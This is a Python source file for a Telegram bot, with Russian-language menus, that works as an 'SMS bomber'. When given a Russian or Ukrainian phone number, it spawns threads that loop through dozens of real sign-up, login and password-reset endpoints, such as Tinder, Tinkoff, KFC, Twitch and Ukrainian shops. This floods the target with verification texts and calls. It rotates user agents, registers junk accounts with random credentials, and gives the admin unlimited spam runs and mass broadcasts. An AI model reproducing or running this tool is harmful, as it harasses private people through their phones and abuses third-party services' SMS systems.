import requests
import threading
import telebot
import telebot as telebot
from telebot import TeleBot
import random, datetime, time
from datetime import datetime, timedelta
from random import choice
import os

TOKEN = os.environ.get('BOT_TOKEN')

THREADS_LIMIT = 10

chat_ids_file = 'chat_ids.txt'
admin = 947353888
ADMIN_CHAT_ID = 947353888

users_amount = [0]
threads = list()
THREADS_AMOUNT = [0]
types = telebot.types
bot = TeleBot(TOKEN)
running_spams_per_chat_id = []

agents_list = (
    'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 6.0; HTC One X10 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.12 Safari/537.36 OPR/14.0.1116.4',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 OPR/32.0.1948.25',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.77 Safari/537.36 Vivaldi/1.7.735.27'
    )
# Usage: request.post(---, headers=random_agent())
def random_agent():
    return {'User-Agent': choice(agents_list)}

def save_chat_id(chat_id):
    "Функция добавляет чат айди в файл если его там нету"
    chat_id = str(chat_id)
    with open(chat_ids_file, "a+") as ids_file:
        ids_file.seek(0)

        ids_list = [line.split('\n')[0] for line in ids_file]

        if chat_id not in ids_list:
            ids_file.write(f'{chat_id}\n')
            ids_list.append(chat_id)
            print(f'New chat_id saved: {chat_id}')
        else:
            print(f'chat_id {chat_id} is already saved')
        users_amount[0] = len(ids_list)
    return


def send_message_users(message):
    def send_message(chat_id):
        data = {
            'chat_id': chat_id,
            'text': message
        }
        response = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', data=data)

    with open(chat_ids_file, "r") as ids_file:
        ids_list = [line.split('\n')[0] for line in ids_file]

    [send_message(chat_id) for chat_id in ids_list]


@bot.message_handler(commands=['start'])
def start(message):
    keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    boom = types.KeyboardButton(text='Бомбер')
    stop = types.KeyboardButton(text='Отключить')
    info = types.KeyboardButton(text='Информация')
    faq = types.KeyboardButton(text='Соглашение')
    buttons_to_add = [boom, stop, info, faq]

    if int(message.chat.id) == ADMIN_CHAT_ID:
        buttons_to_add.append(types.KeyboardButton(text='Рассылка'))

    keyboard.add(*buttons_to_add)
    sti = open('AnimatedSticker.tgs', 'rb')
    bot.send_sticker(message.chat.id, sti)
    bot.send_message(message.chat.id,
                     "Добро пожаловать, {0.first_name}!\nЯ - <b>{1.first_name}</b>, бот созданный чтобы быть подопытным кроликом.".format(
                    message.from_user, bot.get_me()),
    parse_mode = 'html', reply_markup = keyboard)

    save_chat_id(message.chat.id)


def start_spam(chat_id, phone_number, force):
    running_spams_per_chat_id.append(chat_id)

    if force:
        msg = f'Спам запущен на неограниченое время для номера +{phone_number}!'
    else:
        msg = f'Спам запущен на номер +{phone_number}!'

    bot.send_message(chat_id, msg)
    end = datetime.now() + timedelta(minutes=5)
    while (datetime.now() < end) or (force and chat_id == ADMIN_CHAT_ID):
        if chat_id not in running_spams_per_chat_id:
            break
        if phone_number[0] == '3' and phone_number[1] == '8':
            send_for_number_ua(phone_number)
            random_agent()
        elif phone_number[0] == '+':
            send_for_number_ru(phone_number)
            random_agent()
        else:
            pass
    bot.send_message(chat_id, f'Спам атака на номер {phone_number} завершён!')
    THREADS_AMOUNT[0] -= 1  # стояло 1
    try:
        running_spams_per_chat_id.remove(chat_id)
    except Exception:
        pass

def send_for_number_ru(_phone):
    _name = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

    _phone9 = _phone[1:]
    _phoneAresBank = '+' + _phone[0] + '(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]
    _phone9dostavista = _phone9[:3] + '+' + _phone9[3:6] + '-' + _phone9[6:8] + '-' + _phone9[8:10]
    _phoneOstin = '+' + _phone[0] + '+(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]
    _phonePizzahut = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + ' ' + _phone[7:9] + ' ' + _phone[9:11]
    _phoneGorzdrav = _phone[1:4] + ') ' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]

    iteration = 0
    
    while True:

        _email = _name+f'{iteration}'+'@gmail.com'
        email = _name+f'{iteration}'+'@gmail.com'
        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            print('[+] Grab отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
            print('[+] RuTaxi отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
            print('[+] BelkaCar отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
            print('[+] Tinder отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
            print('[+] Karusel отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
            print('[+] Tinkoff отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            print('[+] MTS отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            print('[+] Youla отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
            print('[+] PizzaHut отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            print('[+] Rabota отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
            print('[+] Rutube отправлено!')
        except:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
            print('[+] Citilink отправлено!')

        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
            print('[+] Smsint отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
            print('[+] oyorooms отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
            print('[+] MVideo отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            print('[+] newnext отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            print('[+] Sunlight отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
            print('[+] alpari отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            print('[+] Invitro отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
            print('[+] Sberbank отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
            print('[+] Psbank отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
            print('[+] Beltelcom отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
            print('[+] Karusel отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
            print('[+] KFC отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
            print('[+] carsmile отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            print('[+] Citilink отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            print('[+] Delitime отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
            print('[+] findclone звонок отправлен!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
            print('[+] Guru отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            print('[+] ICQ отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
            print('[+] InDriver отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
            print('[+] Invitro отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
            print('[+] Pmsm отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
            print('[+] IVI отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
            print('[+] Lenta отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
            print('[+] Mail.ru отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            print('[+] MVideo отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
            print('[+] OK отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://plink.tech/register/',json={"phone": _phone})
            print('[+] Plink отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
            print('[+] qlean отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
            print('[+] SMSgorod отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
            print('[+] Tinder отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
            print('[+] Twitch отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
            print('[+] CabWiFi отправлено!')
        except:
            print('[-] Не отправлено!')
        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
            print('[+] wowworks отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
            print('[+] Eda.Yandex отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            print('[+] Youla отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
            print('[+] Alpari отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
            print('[+] SMS отправлено!')
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
            print('[+] Delivery отправлено!')
        except:
            print('[-] Не отправлено!')



        try:
            iteration += 1
            print(('{} круг пройден.').format(iteration))
        except:
            break

def send_for_number_ua(_phone):
    _name = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    stanPass = "kobalado2013"

    _phone9 = _phone[1:]
    _phoneAresBank = '+' + _phone[0] + '(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]
    _phone9dostavista = _phone9[:3] + '+' + _phone9[3:6] + '-' + _phone9[6:8] + '-' + _phone9[8:10]
    _phoneOstin = '+' + _phone[0] + '+(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]
    _phonePizzahut = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + ' ' + _phone[7:9] + ' ' + _phone[9:11]
    _phoneGorzdrav = _phone[1:4] + ') ' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]
    iteration = 0
    while True:
        _email = _name + f'{iteration}' + '@gmail.com'
        email = _name + f'{iteration}' + '@gmail.com'
        _nameRu = 'Гоша'
        try:
            requests.post('https://tehnosvit.ua/iwantring_feedback.html',
                          data={'feedbackName': _name, 'feedbackPhone': '+' + _phone})
            print('[+] Tehnosvit отправлено!')
            time.sleep(0.1)
        except:
            print('[-] Tehnosvit Не отправлено!')

        try:
            requests.post('https://mobileplanet.ua/register',
                          data={'klient_name': _nameRu, 'klient_phone': '+' + _phone, 'klient_email': _email})
            print('[+] Mobileplanet отправлено!')
            time.sleep(0.1)
        except:
            print('[-] Mobileplanet Не отправлено!')

        try:
            requests.post('https://e-vse.online/mail2.php', data={'telephone': '+' + _phone})
            print('[+] E-vse отправлено!')
            time.sleep(0.1)
        except:
            print('[-] E-vse Не отправлено!')

        try:
            requests.post('https://protovar.com.ua/aj_record',
                          data={'object': 'callback', 'user_name': _nameRu, 'contact_phone': _phone[3:]})
            print('[+] Protovar отправлено!')
            time.sleep(0.1)
        except:
            print('[-] Protovar Не отправлено!')

        try:
            requests.post('https://kasta.ua/api/v2/login/', data={"phone": _phone})
            print('[+] Kasta отправлено!')
            time.sleep(0.1)
        except:
            print('[-] Kasta Не отправлено!')

        try:
            requests.post('https://allo.ua/ua/customer/account/createPostVue/?currentTheme=main&currentLocale=uk_UA',
                          data={'firstname': _name, 'telephone': _phone[2:], 'email': _email, 'password': password,
                                'form_key': 'Zqqj7CyjkKG2ImM8'})
            print('[+] ALLO отправлено!')
            time.sleep(0.1)
        except:
            print('[-] ALLO Не отправлено!')

        try:
            requests.post('https://secure.online.ua/ajax/check_phone/?reg_phone=%2B' + _phone[0:7] + '-' + _phone[8:11])
            print('[+] OnloneUA отправлено!')
            time.sleep(0.1)
        except:
            print('[-] OnloneUA Не отправлено!')

        try:
            requests.post('https://707taxi.com.ua/sendSMS.php', data={'tel': _phone[3:]})
            print('[+] 707taxis отправлено!')
            time.sleep(0.1)
        except:
            print('[-] 707taxis Не отправлено!')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone}, headers={})
            print('[+] Tinder отправлено!')
            time.sleep(0.1)
        except:
            print('[-] Tinder Не отправлено!')

        try:
            requests.post('https://comfy.ua/ua/customer/account/createPost',
                          data={'registration_name': _name, 'registration_phone': _phone[2:],
                                'registration_email': _email})
            print('[+] Comfy отправлено!')
            time.sleep(0.1)
        except:
            print('[-] Comfy Не отправлено!')

        try:
            requests.post('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20669-16-10',
                          data={"result": "ok"})
            print('[+] Sportmaster отправлено!')
            time.sleep(0.1)
        except:
            print('[-] Sportmaster Не отправлено!')

        try:
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
            print('[+] Beltelcom отправлено!')
            time.sleep(0.1)
        except:
            print('[-] Beltelcom Не отправлено!')

        try:
            requests.post('https://my.citrus.ua/api/v2/register',
                          data={"email": _email, "name": _name, "phone": _phone[2:], "password": stanPass,
                                "confirm_password": stanPass})
            print('[+] Citrus отправлено!')
            time.sleep(0.1)
        except:
            print('[-] Citrus Не отправлено!')

        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
            print('[+] IVI отправлено!')
            time.sleep(0.1)
        except:
            print('[-] IVI Не отправлено!')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone})
            print('[+] Tinder отправлено!')
            time.sleep(0.1)
        except:
            print('[-] Tinder Не отправлено!')

        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',
                          json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                "password": password, "phone_number": _phone, "username": username})
            print('[+] Twitch отправлено!')
            time.sleep(0.1)
        except:
            print('[-] Twitch Не отправлено!')

        try:
            requests.post('https://www.nl.ua',
                          data={'component': 'bxmaker.authuserphone.login',
                                'sessid': 'bf70db951f54b837748f69b75a61deb4',
                                'method': 'sendCode', 'phone': _phone, 'registration': 'N'})
            print('[+] NovaLinia отправлено!')
            time.sleep(0.1)
        except:
            print('[-] NovaLinia Не отправлено!')

        try:
            iteration += 1
            print(('{} круг пройден.').format(iteration))
            print('Возникли вопросы? Пишите разработчику в телеграм [ --> @artem2424 <-- ]')
            time.sleep(0.1)
        except:
            break


def spam_handler(phone, chat_id, force):
    if int(chat_id) in running_spams_per_chat_id:
        bot.send_message(chat_id,
                         '!Вы уже начали рассылку спама. Дождитесь окончания или нажмите Стоп Спам и поробуйте снова!')
        return

    # Если количество тредов меньше максимального создается новый который занимается спамом
    if THREADS_AMOUNT[0] < THREADS_LIMIT:
        x = threading.Thread(target=start_spam, args=(chat_id, phone, force))
        threads.append(x)
        THREADS_AMOUNT[0] += 1
        x.start()
    else:
        bot.send_message(chat_id, '!Сервера сейчас перегружены. Попытайтесь снова через несколько минут!')
        print('Максимальное количество тредов исполняется. Действие отменено.!')


@bot.message_handler(content_types=['text'])
def handle_message_received(message):
    chat_id = int(message.chat.id)
    text = message.text

    if text == 'Информация':
        bot.send_message(chat_id, '❤️Возникли проблемы? - @viannedi \n Чат элиты - @VV2_Chat \n Спумера создал - @artem2424')
    elif text == 'Бомбер':
        bot.send_message(chat_id,
                         'Введите номер в формате:\n🇺🇦 380xxxxxxxxx\n🇷🇺 7xxxxxxxxxx\n')
    elif text == 'Соглашение':
        bot.send_message(chat_id,
                         'Проходя регестрацию в боте вы соглашаетесь с данными правилами! - https://telegra.ph/FAQ-02-02-5')

    elif text == 'Статистика':
        bot.send_message(chat_id,
                         f'Пользователей🙎‍♂: {users_amount[0]}\n Возникли проблемы? - @viannedi')

    elif text == 'Рассылка' and chat_id == ADMIN_CHAT_ID:
        bot.send_message(chat_id, 'Введите сообщение в формате: "РАЗОСЛАТЬ: ваш_текст" без кавычек')


    elif text == 'Помощь':
        bot.send_message(chat_id, 'Помощь - список команд\n Бомбер - запустить бомбер \n Отключить - отключить бомбер \n Информация - о боте \n\n ❤️ Возникли проблемы? - @viannedi')
    elif text == 'Отключить':
        if chat_id not in running_spams_per_chat_id:
            bot.send_message(chat_id, 'Ты еще ничего не начинал, чтобы заканчивать -_-')
        else:
            running_spams_per_chat_id.remove(chat_id)
            bot.send_message(chat_id, 'Спам на указанный номер, отключен😢')
    elif 'РАЗОСЛАТЬ: ' in text and chat_id == ADMIN_CHAT_ID:
        msg = text.replace("РАЗОСЛАТЬ: ", "")
        send_message_users(msg)

    elif len(text) == 11:
        phone = text
        spam_handler(phone, chat_id, force=False)


    elif len(text) == 12:
        phone = text
        spam_handler(phone, chat_id, force=False)



    elif len(text) == 12 and chat_id == ADMIN_CHAT_ID and text[0] == '_':
        phone = text[1:]
        bot.send_message(chat_id, 'admin!')
        spam_handler(phone, chat_id, force=True)

    else:
        bot.send_message(chat_id, f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')
        print(f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')


if __name__ == '__main__':
    bot.polling(none_stop=True)
